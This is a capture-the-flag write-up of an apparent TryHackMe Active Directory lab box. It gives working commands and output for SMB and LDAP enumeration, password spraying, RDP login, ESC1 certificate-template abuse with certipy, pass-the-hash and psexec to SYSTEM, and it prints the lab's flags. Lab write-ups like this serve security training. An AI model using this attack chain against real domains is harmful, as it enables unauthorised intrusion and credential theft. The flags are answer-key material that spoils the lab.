# CTF Writeup: Ledger

---

## Reconaissance

An initial service version detection scan revealed the following information:

```
nmap -n -Pn -sSCV -p- 10.114.134.197
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-08 18:18 CDT
Nmap scan report for 10.114.134.197
Host is up (0.011s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-08 23:19:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-05-08T22:58:39
|_Not valid after:  2027-05-08T22:58:39
|_ssl-date: 2026-05-08T23:20:25+00:00; 0s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2026-05-08T23:20:25+00:00; 0s from scanner time.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-05-08T22:58:39
|_Not valid after:  2027-05-08T22:58:39
|_ssl-date: 2026-05-08T23:20:25+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-05-08T22:58:39
|_Not valid after:  2027-05-08T22:58:39
|_ssl-date: 2026-05-08T23:20:25+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-05-08T23:20:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-05-08T22:58:39
|_Not valid after:  2027-05-08T22:58:39
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Not valid before: 2026-05-07T23:07:39
|_Not valid after:  2026-11-06T23:07:39
|_ssl-date: 2026-05-08T23:20:25+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: LABYRINTH
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: labyrinth.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-08T23:20:16+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49804/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-08T23:20:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.20 seconds
```

I started off with enumerating SMB Shares, unfortunately anonmyous enumeration wasn't possible. I tried to utilize the guest account to enumerate SMB Shares with "nxc".

```
nxc smb 10.114.134.197 -u 'guest' -p '' --shares        
SMB         10.114.134.197  445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.114.134.197  445    LABYRINTH        [+] thm.local\guest: 
SMB         10.114.134.197  445    LABYRINTH        [*] Enumerated shares
SMB         10.114.134.197  445    LABYRINTH        Share           Permissions     Remark
SMB         10.114.134.197  445    LABYRINTH        -----           -----------     ------
SMB         10.114.134.197  445    LABYRINTH        ADMIN$                          Remote Admin
SMB         10.114.134.197  445    LABYRINTH        C$                              Default share
SMB         10.114.134.197  445    LABYRINTH        IPC$            READ            Remote IPC
SMB         10.114.134.197  445    LABYRINTH        NETLOGON                        Logon server share 
SMB         10.114.134.197  445    LABYRINTH        SYSVOL                          Logon server share
```

## Initial Access

Enumerated users with nxc and saved them up in a "users.txt" wordlist.

```
nxc smb 10.114.134.197 -u 'guest' -p '' --rid-brute
```

Created a good wordlist out of the usernames and saved it into an "newusers.txt" file.

```
grep "SidTypeUser" users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > newusers.txt
```

Utilized ldapsearch in order to enumerate more information abt potential passwords.

```
ldapsearch -x -H ldap://10.10.161.74 -b "dc=thm,dc=local" > ldapsearch.txt
```

Checked for user descriptions, since sometimes passwords are getting stored in there.

```
cat ldapsearch.txt | grep description
```

Performed bruteforcing on SMB and got valid credentials.

```
nxc smb 10.114.134.197 -u newusers.txt -p 'CHANGEME2023!'
```

```
IVY_WILLIS:CHANGEME2023!
```

My 2nd methodology regarding bruteforce is using the tool "Kerbrute".

```
./kerbrute -d thm.local --dc 10.114.134.197 passwordspray ~/newusers.txt 'CHANGEME2023!'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/08/26 - Ronnie Flathers @ropnop

2026/05/08 19:27:52 >  Using KDC(s):
2026/05/08 19:27:52 >   10.114.134.197:88

2026/05/08 19:27:54 >  [+] VALID LOGIN:  IVY_WILLIS@thm.local:CHANGEME2023!
2026/05/08 19:27:54 >  [+] VALID LOGIN:  SUSANNA_MCKNIGHT@thm.local:CHANGEME2023!
2026/05/08 19:27:59 >  Done! Tested 493 logins (2 successes) in 7.030 seconds
```

I sprayed rdp with nxc and gained access!

```
nxc rdp 10.114.134.197 -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!'
RDP         10.114.134.197  3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
RDP         10.114.134.197  3389   LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023! (Pwn3d!)
```

Connected to the Server via RDP.

```
xfreerdp3 /cert:ignore /clipboard /compression /auto-reconnect /u:SUSANNA_MCKNIGHT /p:'CHANGEME2023!' /v:10.114.134.197 /w:1600 /h:800 /drive:test,/home/saitama/Desktop
```

Retrieved user.txt in C:\Users\SUSANNA_MCKNIGHT\Desktop

```
THM{ENUMERATION_IS_THE_KEY}
```

## Privilege Escalation

Since we identified that there is an HTTPS Server running, there could be an possibility that there is an internal CA running inside the AD. Let's utilize "certipy" in order to potentially find an privesc or callback for more information.

```
certipy-ad find -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' -dc-ip 10.201.64.95 -target thm.local -vulnerable -enabled
```

The Information revealed that it's vulnerable to "ESC1", which means we can request certificates for all users.

I requested the certificate for user "bradley_ortiz".  Since I retrieved him earlier on the Server.

```
certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'BRADLEY_ORTIZ@thm.local' -dc-ip 10.113.155.93 -target labyrinth.thm.local
```

I authorized my certificate against the CA & retrieved the hash for user bradley!

```
certipy-ad auth -pfx bradley_ortiz.pfx -dc-ip 10.113.155.93
```

Sprayed SMB and saw that we pwned the server with bradley's credentials, which means we rooted the box!

```
nxc smb 10.113.155.93 -u bradley_ortiz -H aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d
SMB         10.113.155.93   445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.113.155.93   445    LABYRINTH        [+] thm.local\bradley_ortiz:16ec31963c93240962b7e60fd97b495d (Pwn3d!)
```

Connected to the Server via psexec and gained nt authority\system.

```
impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d' bradley_ortiz@10.113.155.93
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.113.155.93.....
[*] Found writable share ADMIN$
[*] Uploading file BkpTOPjr.exe
[*] Opening SVCManager on 10.113.155.93.....
[*] Creating service IwRg on 10.113.155.93.....
[*] Starting service IwRg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4377]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved root.txt in C:\Users\Administrator\Desktop

```
THM{THE_BYPASS_IS_CERTIFIED!}
```
